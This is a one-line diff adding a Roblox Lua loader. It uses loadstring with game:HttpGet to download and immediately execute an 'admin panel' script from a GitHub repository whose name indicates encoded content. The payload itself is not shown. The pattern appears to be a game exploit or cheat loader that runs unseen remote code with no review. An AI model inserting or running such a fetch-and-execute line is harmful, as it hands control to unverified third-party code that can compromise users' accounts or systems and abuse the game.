@@ -1,1 +1,1 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/assure157tv157157157-boop/Spectra-tudo-codificado/refs/heads/main/Painel%20admin.txt"))()
